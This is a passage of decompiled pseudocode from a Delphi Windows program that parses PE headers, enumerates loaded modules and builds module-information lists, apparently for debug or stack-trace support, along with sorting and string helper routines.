      if ( IsBadReadPtr(v2, 0x108u) || *v2 != 17744 )
        return 0;
    }
  }
  return v2;
}

//----- (0042BC60) --------------------------------------------------------
int __fastcall sub_42BC60(_DWORD *a1)
{
  int v1; // ebx
  _DWORD *v2; // eax
  __int16 v3; // ax

  v1 = 0;
  v2 = sub_42BBA0(a1);
  if ( v2 )
  {
    v3 = *((_WORD *)v2 + 2) - 332;
    if ( v3 )
    {
      if ( v3 == -31464 )
        LOBYTE(v1) = 2;
    }
    else
    {
      LOBYTE(v1) = 1;
    }
  }
  return v1;
}

//----- (0042BC90) --------------------------------------------------------
int __fastcall sub_42BC90(_DWORD *lp)
{
  char v2; // al
  int v3; // esi
  _DWORD *v4; // eax
  int v5; // esi
  _DWORD *v6; // eax

  v2 = sub_42BC60(lp) - 1;
  if ( v2 )
  {
    if ( v2 == 1 )
    {
      v5 = 0;
      v6 = sub_42BC00(lp);
      if ( v6 )
        return v6[20];
      return v5;
    }
    else
    {
      return 0;
    }
  }
  else
  {
    v3 = 0;
    v4 = sub_42BBA0(lp);
    if ( v4 )
      return v4[20];
    return v3;
  }
}

//----- (0042BCE0) --------------------------------------------------------
int __fastcall sub_42BCE0(int a1)
{
  if ( a1 )
    return a1 + 24 + *(unsigned __int16 *)(a1 + 20);
  else
    return 0;
}

//----- (0042BD10) --------------------------------------------------------
int __fastcall sub_42BD10(int a1)
{
  if ( a1 )
    return a1 + 24 + *(unsigned __int16 *)(a1 + 20);
  else
    return 0;
}

//----- (0042BD40) --------------------------------------------------------
int __fastcall sub_42BD40(int a1, BOOL *a2)
{
  const CHAR *v3; // edi
  const CHAR *v4; // esi
  int v5; // ebx
  unsigned int v7[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v8; // [esp-4h] [ebp-1Ch]
  const CHAR *v9; // [esp+10h] [ebp-8h]
  __int32 v10; // [esp+14h] [ebp-4h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v10 = 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_42BDC5;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v9 = 0;
  if ( a1 )
  {
    sub_40B238(a2, &v10);
    v3 = (const CHAR *)sub_4074F8(v10);
    v4 = (const CHAR *)sub_42BCE0(a1);
    if ( *(_WORD *)(a1 + 6) )
    {
      v5 = *(unsigned __int16 *)(a1 + 6);
      while ( !sub_42B700(v4, v3, 8, 0) )
      {
        v4 += 40;
        if ( !--v5 )
          goto LABEL_7;
      }
      v9 = v4;
    }
  }
LABEL_7:
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_42BDCC;
  sub_406C68(&v10);
  return (int)v9;
}

//----- (0042BDE0) --------------------------------------------------------
int __fastcall sub_42BDE0(int a1, BOOL *a2)
{
  const CHAR *v3; // edi
  const CHAR *v4; // esi
  int v5; // ebx
  unsigned int v7[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v8; // [esp-4h] [ebp-1Ch]
  const CHAR *v9; // [esp+10h] [ebp-8h]
  __int32 v10; // [esp+14h] [ebp-4h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v10 = 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_42BE65;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v9 = 0;
  if ( a1 )
  {
    sub_40B238(a2, &v10);
    v3 = (const CHAR *)sub_4074F8(v10);
    v4 = (const CHAR *)sub_42BD10(a1);
    if ( *(_WORD *)(a1 + 6) )
    {
      v5 = *(unsigned __int16 *)(a1 + 6);
      while ( !sub_42B700(v4, v3, 8, 0) )
      {
        v4 += 40;
        if ( !--v5 )
          goto LABEL_7;
      }
      v9 = v4;
    }
  }
LABEL_7:
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_42BE6C;
  sub_406C68(&v10);
  return (int)v9;
}

//----- (0042BE80) --------------------------------------------------------
int __fastcall sub_42BE80(_DWORD *a1, BOOL *a2)
{
  int v3; // ebx
  _DWORD *v4; // eax

  v3 = 0;
  v4 = sub_42BBA0(a1);
  if ( v4 )
    return sub_42BD40((int)v4, a2);
  return v3;
}

//----- (0042BEB0) --------------------------------------------------------
int __fastcall sub_42BEB0(_DWORD *a1, BOOL *a2)
{
  int v3; // ebx
  _DWORD *v4; // eax

  v3 = 0;
  v4 = sub_42BC00(a1);
  if ( v4 )
    return sub_42BDE0((int)v4, a2);
  return v3;
}

//----- (0042BEE0) --------------------------------------------------------
int __fastcall sub_42BEE0(_DWORD *a1, BOOL *a2)
{
  char v4; // al

  v4 = sub_42BC60(a1) - 1;
  if ( !v4 )
    return sub_42BE80(a1, a2);
  if ( v4 == 1 )
    return sub_42BEB0(a1, a2);
  return 0;
}

//----- (0042BF50) --------------------------------------------------------
_DWORD *__usercall sub_42BF50@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>, int a4)
{
  int v6; // ebx
  unsigned int v8[2]; // [esp-Ch] [ebp-230h] BYREF
  int *v9; // [esp-4h] [ebp-228h]
  int v10; // [esp+8h] [ebp-21Ch] BYREF
  int v11[3]; // [esp+Ch] [ebp-218h] BYREF
  __int16 v12[261]; // [esp+1Ah] [ebp-20Ah] BYREF
  int savedregs; // [esp+224h] [ebp+0h] BYREF

  v10 = 0;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_42C02D;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v11[2] = 0;
  v12[0] = 0;
  if ( *off_4680F4[0] && (*(int (__stdcall **)(int, int, int *, int))off_4680F4[0])(a1, a2, v11, 12) )
  {
    if ( *(_BYTE *)(a4 - 1) )
    {
      sub_429140(*(_DWORD *)(a4 - 8), 0, v11[0], a3);
    }
    else if ( ((int (__stdcall *)(int, int, __int16 *, int))*off_467FD8)(a1, a2, v12, 522) )
    {
      v6 = *(_DWORD *)(a4 - 8);
      unknown_libname_51(&v10, v12, 261);
      sub_429140(v6, v10, v11[0], a3);
    }
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_42C034;
  return sub_406C44(&v10);
}
// 407824: using guessed type int __fastcall unknown_libname_51(_DWORD, _DWORD, _DWORD);
// 467FD8: using guessed type int *off_467FD8;
// 4680F4: using guessed type int *off_4680F4[2];

//----- (0042C040) --------------------------------------------------------
BOOL __usercall sub_42C040@<eax>(void *a1@<eax>, int a2)
{
  char *v2; // ebx
  PVOID v3; // edi
  DWORD v4; // eax
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+Ch] [ebp-28h] BYREF
  PVOID AllocationBase; // [esp+28h] [ebp-Ch]
  bool v8; // [esp+2Fh] [ebp-5h]
  HANDLE hProcess; // [esp+30h] [ebp-4h]

  hProcess = a1;
  v2 = 0;
  v3 = 0;
  sub_4051B8(&Buffer, 28, 0);
  v4 = VirtualQueryEx(hProcess, 0, &Buffer, 0x1Cu);
  v8 = v4 == 28;
  if ( v4 == 28 )
  {
    do
    {
      if ( v3 != Buffer.AllocationBase )
      {
        if ( Buffer.Type == 0x1000000 )
        {
          AllocationBase = Buffer.AllocationBase;
          sub_42BF50((int)hProcess, (int)Buffer.AllocationBase, (int)v3, a2);
        }
        v3 = Buffer.AllocationBase;
      }
      v2 += 2 * Buffer.RegionSize;
    }
    while ( VirtualQueryEx(hProcess, v2, &Buffer, 0x1Cu) == 28 );
  }
  return v8;
}

//----- (0042C0D0) --------------------------------------------------------
int __usercall sub_42C0D0@<eax>(int a1@<edi>, int a2)
{
  unsigned int v2; // ebx
  int v3; // ebx
  int v4; // ebx
  int v5; // esi
  unsigned int v7[2]; // [esp-18h] [ebp-30h] BYREF
  int *v8; // [esp-10h] [ebp-28h]
  unsigned int v9[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v10; // [esp-4h] [ebp-1Ch]
  unsigned int v11; // [esp+8h] [ebp-10h] BYREF
  HANDLE hObject; // [esp+Ch] [ebp-Ch]
  unsigned __int8 v13; // [esp+13h] [ebp-5h]
  int v14; // [esp+14h] [ebp-4h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v14 = 0;
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_42C203;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v13 = 0;
  sub_408B34(&v14, (int)&byte_42BF1C);
  hObject = OpenProcess(0x410u, 0, *(_DWORD *)(a2 - 12));
  if ( hObject )
  {
    v8 = &savedregs;
    v7[1] = (unsigned int)&loc_42C1E0;
    v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v7);
    v11 = 0;
    if ( *off_46819C )
      v13 = ((int (__stdcall *)(HANDLE, _DWORD, _DWORD, unsigned int *))*off_46819C)(hObject, 0, 0, &v11) != 0;
    if ( v13 )
    {
      v2 = v11 >> 2;
      System::__linkproc__ DynArraySetLength(v11 >> 2);
      if ( ((int (__stdcall *)(HANDLE, int, unsigned int, unsigned int *))*off_46819C)(hObject, v14, v11, &v11) )
      {
        v3 = v2 - 1;
        if ( v3 >= 0 )
        {
          v4 = v3 + 1;
          v5 = 0;
          do
          {
            sub_42BF50((int)hObject, *(_DWORD *)(v14 + 4 * v5++), a1, a2);
            --v4;
          }
          while ( v4 );
        }
      }
    }
    else
    {
      v13 = sub_42C040(hObject, a2);
    }
    __writefsdword(0, v7[0]);
    v8 = (int *)&loc_42C1E7;
    CloseHandle_0(hObject);
  }
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_42C20A;
  sub_408B34(&v14, (int)&byte_42BF1C);
  return v13;
}
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 42BF1C: using guessed type char byte_42BF1C;
// 46819C: using guessed type int *off_46819C;

//----- (0042C220) --------------------------------------------------------
int __usercall sub_42C220@<eax>(int a1@<edi>)
{
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  return sub_42C0D0(a1, (int)&savedregs);
}

//----- (0042C240) --------------------------------------------------------
int __usercall sub_42C240@<eax>(int a1@<edi>)
{
  return sub_42C630(dword_466A38, a1);
}
// 466A38: using guessed type int dword_466A38;

//----- (0042C250) --------------------------------------------------------
int __fastcall sub_42C250(_DWORD **a1)
{
  return sub_42C830(dword_466A38, a1);
}
// 466A38: using guessed type int dword_466A38;

//----- (0042C270) --------------------------------------------------------
int __userpurge sub_42C270@<eax>(int a1@<eax>, char a2@<dl>, char a3@<cl>, int a4@<edi>, char a5)
{
  char v5; // bl
  int v6; // esi
  char v8; // [esp+Bh] [ebp-1h]

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v5 = a3;
  v8 = a2;
  v6 = a1;
  sub_42B770(a1, 0, 1);
  *(_BYTE *)(v6 + 12) = v5;
  *(_BYTE *)(v6 + 13) = a5;
  if ( !*(_BYTE *)(v6 + 12) )
    sub_42C310((_DWORD *)v6, a4);
  if ( v8 )
    System::__linkproc__ AfterConstruction(v6);
  return v6;
}
// 42C282: variable 'a3' is possibly undefined
// 42C284: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);

//----- (0042C2D0) --------------------------------------------------------
bool __fastcall sub_42C2D0(int a1, const void *a2, char a3)
{
  return !sub_42C500(a1, a2) && sub_42C3E0(a1, a2, a3) != 0;
}

//----- (0042C310) --------------------------------------------------------
_DWORD *__usercall sub_42C310@<eax>(_DWORD *result@<eax>, int a2@<edi>)
{
  int v2; // esi
  int **v3; // ebx
  int v4; // edi
  unsigned int v5; // ebx
  unsigned int v6[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v7; // [esp-4h] [ebp-18h]
  LPCVOID lpAddress; // [esp+Ch] [ebp-8h]
  Idthreadcomponent::TIdThreadComponent *v9; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v2 = (int)result;
  if ( *((_BYTE *)result + 13) )
  {
    v3 = (int **)*off_46815C;
    if ( *off_46815C )
    {
      do
      {
        lpAddress = v3[1];
        result = (_DWORD *)sub_42C3E0(v2, lpAddress, 1);
        v3 = (int **)*v3;
      }
      while ( v3 );
    }
  }
  else
  {
    v9 = (Idthreadcomponent::TIdThreadComponent *)sub_405568((int)cls_CrossPlatform_TUnicodeStringList, 1);
    v7 = &savedregs;
    v6[1] = (unsigned int)&loc_42C3CB;
    v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v6);
    GetCurrentProcessId();
    sub_42C220(a2);
    if ( *((_DWORD *)v9 + 2) - 1 >= 0 )
    {
      v4 = *((_DWORD *)v9 + 2);
      v5 = 0;
      do
      {
        if ( *((_DWORD *)v9 + 2) <= v5 )
          Idthreadcomponent::TIdThreadComponent::SetThreadName(v9, v5);
        sub_42C3E0(v2, *(LPCVOID *)(*((_DWORD *)v9 + 1) + 8 * v5++ + 4), 0);
        --v4;
      }
      while ( v4 );
    }
    __writefsdword(0, v6[0]);
    v7 = (int *)&loc_42C3D2;
    return sub_405598(v9);
  }
  return result;
}
// 4232BC: using guessed type int (*cls_CrossPlatform_TUnicodeStringList[3])();
// 46815C: using guessed type int *off_46815C;

//----- (0042C3E0) --------------------------------------------------------
int __fastcall sub_42C3E0(int a1, LPCVOID lpAddress, char a3)
{
  int v3; // ebx
  _DWORD *v4; // eax
  int v5; // esi
  int v6; // edi

  v3 = 0;
  v4 = sub_42B260(lpAddress);
  v5 = (int)v4;
  if ( v4 )
  {
    v6 = sub_42BC90(v4);
    if ( v6 )
    {
      v3 = sub_405568((int)&cls_DebugModuleInfoUtil_TModuleInfo, 1);
      *(_DWORD *)(v3 + 12) = v5;
      *(_DWORD *)(v3 + 4) = v6;
      *(_DWORD *)(v3 + 8) = v6 + v5 - 1;
      if ( a3 )
        *(_BYTE *)(v3 + 16) = 1;
      else
        *(_BYTE *)(v3 + 16) = sub_42B2A0(v5);
    }
  }
  if ( v3 )
    sub_427F40(*(_DWORD **)(a1 + 4), v3);
  return v3;
}
// 42B9E4: using guessed type __int16 cls_DebugModuleInfoUtil_TModuleInfo;

//----- (0042C470) --------------------------------------------------------
int __fastcall sub_42C470(int a1, const void *a2)
{
  int v3; // eax
  int v4; // ebx
  unsigned int v5; // esi
  int v6; // eax
  int v8; // [esp+1Ch] [ebp-8h]

  v8 = 0;
  v3 = *(_DWORD *)(a1 + 4);
  if ( *(_DWORD *)(v3 + 8) - 1 >= 0 )
  {
    v4 = *(_DWORD *)(v3 + 8);
    v5 = 0;
    while ( 1 )
    {
      v6 = sub_428060(*(Idthreadcomponent::TIdThreadComponent **)(a1 + 4), v5);
      if ( *(_DWORD *)(v6 + 12) <= (unsigned int)a2 && *(_DWORD *)(v6 + 8) > (unsigned int)a2 )
        break;
      ++v5;
      if ( !--v4 )
        goto LABEL_7;
    }
    v8 = v6;
  }
LABEL_7:
  if ( *(_BYTE *)(a1 + 12) && !v8 )
    return sub_42C3E0(a1, a2, 0);
  return v8;
}

//----- (0042C500) --------------------------------------------------------
bool __fastcall sub_42C500(int a1, const void *a2)
{
  return sub_42C470(a1, a2) != 0;
}

//----- (0042C520) --------------------------------------------------------
bool __fastcall sub_42C520(int a1, const void *a2)
{
  int v3; // eax

  if ( (*(_BYTE *)off_467EF0 & 8) != 0 )
    return sub_42C470(a1, a2) != 0;
  v3 = sub_42C470(a1, a2);
  return v3 && *(_BYTE *)(v3 + 16);
}
// 467EF0: using guessed type void *off_467EF0;

//----- (0042C570) --------------------------------------------------------
int __fastcall sub_42C570(int a1, char a2)
{
  char v2; // bl
  int v3; // esi

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v2 = a2;
  v3 = a1;
  *(_DWORD *)(a1 + 12) = sub_428540((int)cls_CrossPlatform_TCriticalSection, 1);
  if ( v2 )
    System::__linkproc__ AfterConstruction(v3);
  return v3;
}
// 42C581: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);
// 4231F0: using guessed type int (*cls_CrossPlatform_TCriticalSection[3])();

//----- (0042C5B0) --------------------------------------------------------
int sub_42C5B0()
{
  __int64 v0; // rax
  char v1; // bl
  int v2; // esi
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  int result; // eax
  _DWORD *v6; // [esp+10h] [ebp-4h]

  v0 = System::__linkproc__ BeforeDestruction();
  v1 = BYTE4(v0);
  v2 = v0;
  v6 = (_DWORD *)(v0 + 12);
  LODWORD(v0) = *(_DWORD *)(v0 + 12);
  *v6 = 0;
  sub_405598((_DWORD *)v0);
  v3 = *(_DWORD **)(v2 + 16);
  *(_DWORD *)(v2 + 16) = 0;
  sub_405598(v3);
  v4 = *(_DWORD **)(v2 + 4);
  *(_DWORD *)(v2 + 4) = 0;
  sub_405598(v4);
  result = sub_405588();
  if ( v1 > 0 )
    return System::__linkproc__ ClassDestroy(v2);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);

//----- (0042C630) --------------------------------------------------------
int __usercall sub_42C630@<eax>(int a1@<eax>, int a2@<edi>)
{
  bool v2; // bl
  _DWORD *v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  Idthreadcomponent::TIdThreadComponent *v8; // ebx
  const WCHAR *v9; // eax
  unsigned int v11[2]; // [esp-24h] [ebp-4Ch] BYREF
  int *v12; // [esp-1Ch] [ebp-44h]
  unsigned int v13[2]; // [esp-18h] [ebp-40h] BYREF
  int *v14; // [esp-10h] [ebp-38h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-34h] BYREF
  void *v16; // [esp-8h] [ebp-30h]
  int *v17; // [esp-4h] [ebp-2Ch]
  void *v18; // [esp+0h] [ebp-28h]
  HMODULE v19; // [esp+4h] [ebp-24h]
  int v20; // [esp+8h] [ebp-20h]
  int v21; // [esp+Ch] [ebp-1Ch]
  HMODULE ModuleHandleW_2; // [esp+10h] [ebp-18h]
  char v23; // [esp+17h] [ebp-11h]
  int System__AnsiString; // [esp+18h] [ebp-10h]
  int v25; // [esp+1Ch] [ebp-Ch]
  int v26; // [esp+20h] [ebp-8h]
  __int32 v27; // [esp+24h] [ebp-4h] BYREF
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v27 = 0;
  v26 = a1;
  v17 = &savedregs;
  v16 = &loc_42C81F;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v23 = *off_467F44;
  if ( v23 )
    (***(void (__fastcall ****)(_DWORD))(v26 + 12))(*(_DWORD *)(v26 + 12));
  v14 = &savedregs;
  v13[1] = (unsigned int)&loc_42C802;
  v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  if ( *(_DWORD *)(v26 + 16) )
  {
    v25 = *(_DWORD *)(v26 + 16);
  }
  else
  {
    v2 = (*(_BYTE *)off_467EF0 & 8) == 0;
    v25 = sub_42C270((int)&cls_DebugModuleInfoUtil_TModuleInfoList, 1, 0, a2, v2);
    if ( v2 )
    {
      v3 = sub_408B34((_DWORD *)(v26 + 8), (int)&byte_42B038);
      if ( (unsigned __int8)sub_432070(v3) )
      {
        v20 = *(_DWORD *)(v26 + 8);
        v4 = v20;
        if ( v20 )
          v4 = *(_DWORD *)(v20 - 4);
        v5 = v4 - 1;
        if ( v5 >= 0 )
        {
          v21 = v5 + 1;
          System__AnsiString = 0;
          do
          {
            sub_42C2D0(v25, *(const void **)(*(_DWORD *)(v26 + 8) + 4 * System__AnsiString++), 1);
            --v21;
          }
          while ( v21 );
        }
      }
    }
    v6 = *(_DWORD *)(v26 + 4);
    if ( v6 )
    {
      v7 = *(_DWORD *)(v6 + 8) - 1;
      if ( v7 >= 0 )
      {
        v21 = v7 + 1;
        System__AnsiString = 0;
        do
        {
          v12 = &savedregs;
          v11[1] = (unsigned int)&loc_42C790;
          v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
          __writefsdword(0, (unsigned int)v11);
          v8 = *(Idthreadcomponent::TIdThreadComponent **)(v26 + 4);
          sub_406C44(&v27);
          if ( *((_DWORD *)v8 + 2) <= (unsigned int)System__AnsiString )
            Idthreadcomponent::TIdThreadComponent::SetThreadName(v8, System__AnsiString);
          sub_407030(&v27, *(_DWORD *)(*((_DWORD *)v8 + 1) + 8 * System__AnsiString));
          v9 = (const WCHAR *)sub_407790(v27);
          ModuleHandleW_2 = GetModuleHandleW_2(v9);
          __writefsdword(0, v11[0]);
          v12 = (int *)&loc_42C797;
          sub_406C44(&v27);
          if ( ModuleHandleW_2 )
          {
            v19 = ModuleHandleW_2;
            if ( !sub_42C470(v25, ModuleHandleW_2) )
              sub_42C2D0(v25, ModuleHandleW_2, 1);
          }
          ++System__AnsiString;
          --v21;
        }
        while ( v21 );
      }
    }
    if ( (*(_BYTE *)off_467EF0 & 0x10) != 0 )
      *(_DWORD *)(v26 + 16) = v25;
  }
  __writefsdword(0, v13[0]);
  v14 = (int *)&loc_42C809;
  if ( v23 )
    (*(void (__fastcall **)(_DWORD))(**(_DWORD **)(v26 + 12) + 4))(*(_DWORD *)(v26 + 12));
  __writefsdword(0, (unsigned int)v16);
  v18 = &loc_42C826;
  sub_406C44(&v27);
  return v25;
}
// 42B038: using guessed type char byte_42B038;
// 42BA88: using guessed type __int16 cls_DebugModuleInfoUtil_TModuleInfoList;
// 467EF0: using guessed type void *off_467EF0;
// 467F44: using guessed type char *off_467F44;

//----- (0042C830) --------------------------------------------------------
int __fastcall sub_42C830(int result, _DWORD **a2)
{
  _DWORD *v2; // eax
  unsigned int v3[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v4; // [esp-4h] [ebp-10h]
  char v5; // [esp+3h] [ebp-9h]
  _DWORD **v6; // [esp+4h] [ebp-8h]
  int v7; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v6 = a2;
  v7 = result;
  if ( result )
  {
    result = *(_DWORD *)(v7 + 16);
    if ( (_DWORD *)result != *v6 )
    {
      v5 = *off_467F44;
      if ( v5 )
        (***(void (__fastcall ****)(_DWORD))(v7 + 12))(*(_DWORD *)(v7 + 12));
      v4 = &savedregs;
      v3[1] = (unsigned int)&loc_42C8A8;
      v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v3);
      v2 = *v6;
      *v6 = 0;
      sub_405598(v2);
      result = 0;
      __writefsdword(0, v3[0]);
      v4 = (int *)&loc_42C8AF;
      if ( v5 )
        return (*(int (__fastcall **)(_DWORD))(**(_DWORD **)(v7 + 12) + 4))(*(_DWORD *)(v7 + 12));
    }
  }
  return result;
}
// 467F44: using guessed type char *off_467F44;

//----- (0042C8C0) --------------------------------------------------------
_DWORD *sub_42C8C0()
{
  _DWORD *v0; // eax
  _DWORD *result; // eax

  if ( !++dword_46ED94 )
  {
    v0 = (_DWORD *)dword_466A38;
    dword_466A38 = 0;
    return sub_405598(v0);
  }
  return result;
}
// 466A38: using guessed type int dword_466A38;
// 46ED94: using guessed type int dword_46ED94;

//----- (0042CBC0) --------------------------------------------------------
int __fastcall sub_42CBC0(int a1, signed int a2, signed int a3)
{
  signed int v3; // ebx
  signed int v4; // edx
  int v5; // ecx
  int i; // eax
  int result; // eax
  _DWORD *v8; // ecx
  int v9; // [esp+Ch] [ebp-1Ch]
  int v10; // [esp+10h] [ebp-18h]
  int v11; // [esp+14h] [ebp-14h]
  unsigned int v12; // [esp+18h] [ebp-10h]

  do
  {
    v3 = a2;
    v4 = a3;
    v12 = (unsigned int)(a3 + a2) >> 1;
    do
    {
      v5 = *(_DWORD *)(a1 + 12 * v12 + 4);
      for ( i = a1 + 12 * v3; *(_DWORD *)(i + 4) - v5 < 0; i += 12 )
        ++v3;
      for ( result = a1 + 12 * v4; *(_DWORD *)(result + 4) - v5 > 0; result -= 12 )
        --v4;
      if ( v4 >= v3 )
      {
        if ( v4 != v3 )
        {
          v9 = *(_DWORD *)(a1 + 12 * v3);
          v10 = *(_DWORD *)(a1 + 12 * v3 + 4);
          v11 = *(_DWORD *)(a1 + 12 * v3 + 8);
          v8 = (_DWORD *)(a1 + 12 * v3);
          *v8 = *(_DWORD *)(a1 + 12 * v4);
          v8[1] = *(_DWORD *)(a1 + 12 * v4 + 4);
          v8[2] = *(_DWORD *)(a1 + 12 * v4 + 8);
          result = 3 * v4;
          *(_DWORD *)(a1 + 4 * result) = v9;
          *(_DWORD *)(a1 + 4 * result + 4) = v10;
          *(_DWORD *)(a1 + 4 * result + 8) = v11;
        }
        if ( v3 == v12 )
        {
          v12 = v4;
        }
        else if ( v4 == v12 )
        {
          v12 = v3;
        }
        ++v3;
        --v4;
      }
    }
    while ( v4 >= v3 );
    if ( v4 > a2 )
      result = sub_42CBC0(a1, a2, v4);
    a2 = v3;
  }
  while ( v3 < a3 );
  return result;
}

//----- (0042CCC0) --------------------------------------------------------
int __fastcall sub_42CCC0(int a1, int a2, int a3)
{
  int v3; // ebx
  int v4; // esi
  int v5; // edx
  int i; // eax
  int j; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-3Ch] BYREF
  void *v10; // [esp-8h] [ebp-38h]
  int *v11; // [esp-4h] [ebp-34h]
  unsigned int v12; // [esp+Ch] [ebp-24h]
  int v13; // [esp+10h] [ebp-20h]
  int v14; // [esp+14h] [ebp-1Ch]
  int v15; // [esp+18h] [ebp-18h]
  char v16[20]; // [esp+1Ch] [ebp-14h] BYREF
  int savedregs; // [esp+30h] [ebp+0h] BYREF

  v13 = a3;
  v14 = a2;
  v15 = a1;
  sub_407D10((int)v16, (int)&byte_42C9F8);
  v11 = &savedregs;
  v10 = &loc_42CDE0;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  do
  {
    v3 = v14;
    v4 = v13;
    v12 = (unsigned int)(v13 + v14) >> 1;
    do
    {
      v5 = *(_DWORD *)(v15 + 20 * v12 + 4);
      for ( i = v15 + 20 * v3; *(_DWORD *)(i + 4) - v5 < 0; i += 20 )
        ++v3;
      for ( j = v15 + 20 * v4; *(_DWORD *)(j + 4) - v5 > 0; j -= 20 )
        --v4;
      if ( v4 >= v3 )
      {
        if ( v4 != v3 )
        {
          sub_407F98((int)v16, v15 + 20 * v3, (int)&byte_42C9F8);
          sub_407F98(v15 + 20 * v3, v15 + 20 * v4, (int)&byte_42C9F8);
          sub_407F98(v15 + 20 * v4, (int)v16, (int)&byte_42C9F8);
        }
        if ( v3 == v12 )
        {
          v12 = v4;
        }
        else if ( v4 == v12 )
        {
          v12 = v3;
        }
        ++v3;
        --v4;
      }
    }
    while ( v4 >= v3 );
    if ( v4 > v14 )
      sub_42CCC0(v15, v14, v4, v11, v10, ExceptionList);
    v14 = v3;
  }
  while ( v3 < v13 );
  __writefsdword(0, (unsigned int)ExceptionList);
  v11 = (int *)&loc_42CDE7;
  return sub_407DEC((int)v16, (int)&byte_42C9F8);
}
// 42C9F8: using guessed type char byte_42C9F8;

//----- (0042CDF0) --------------------------------------------------------
_DWORD *__fastcall sub_42CDF0(void *a1, int a2)
{
  unsigned int v3[2]; // [esp-10h] [ebp-14h] BYREF
  int *v4; // [esp-8h] [ebp-Ch]
  int System__WideString; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  System__WideString = 0;
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_42CE33;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  sub_406DE4(&System__WideString, a1, a2, 0);
  System::UTF8Encode(System__WideString);
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_42CE3A;
  return sub_406C68(&System__WideString);
}

//----- (0042CE70) --------------------------------------------------------
int __fastcall sub_42CE70(int a1, int a2)
{
  int v2; // ecx

  v2 = *(_DWORD *)(a1 + 8) - *(_DWORD *)(a2 + 8);
  if ( *(_DWORD *)(a1 + 8) == *(_DWORD *)(a2 + 8) )
    return *(_DWORD *)(a1 + 4) - *(_DWORD *)(a2 + 4);
  return v2;
}

//----- (0042CE90) --------------------------------------------------------
int __fastcall sub_42CE90(_BYTE *a1)
{
  int v1; // edx

  v1 = 0;
  if ( (unsigned __int8)(*a1 - 48) < 0xAu )
    LOBYTE(v1) = 1;
  return v1;
}

//----- (0042CEA0) --------------------------------------------------------
_BYTE *__fastcall sub_42CEA0(_BYTE *result, unsigned int a2)
{
  while ( a2 > (unsigned int)result )
  {
    if ( (unsigned __int8)(*result - 48) >= 0xAu )
      break;
    if ( a2 > (unsigned int)++result )
    {
      do
      {
        if ( *result == 10 )
          break;
        if ( *result == 13 )
          break;
        ++result;
      }
      while ( a2 > (unsigned int)result );
    }
    while ( a2 > (unsigned int)result && *result <= 0x20u )
      ++result;
  }
  return result;
}

//----- (0042CF50) --------------------------------------------------------
int sub_42CF50()
{
  __int64 v0; // rax
  char v1; // bl
  int v2; // esi
  int result; // eax
  _DWORD *v4; // [esp+8h] [ebp-4h]

  v0 = System::__linkproc__ BeforeDestruction();
  v1 = BYTE4(v0);
  v2 = v0;
  v4 = (_DWORD *)(v0 + 4);
  LODWORD(v0) = *(_DWORD *)(v0 + 4);
  *v4 = 0;
  sub_405598((_DWORD *)v0);
  result = sub_405588();
  if ( v1 > 0 )
    return System::__linkproc__ ClassDestroy(v2);
  return result;
}
